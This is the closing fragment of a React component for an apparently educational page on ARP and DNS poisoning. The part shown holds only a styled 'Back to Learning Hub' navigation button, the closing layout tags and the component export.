        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
          >
            Back to Learning Hub
          </Button>
        </Box>
      </Container>
    </LearnPageLayout>
  );
};

export default ArpDnsPoisoningPage;
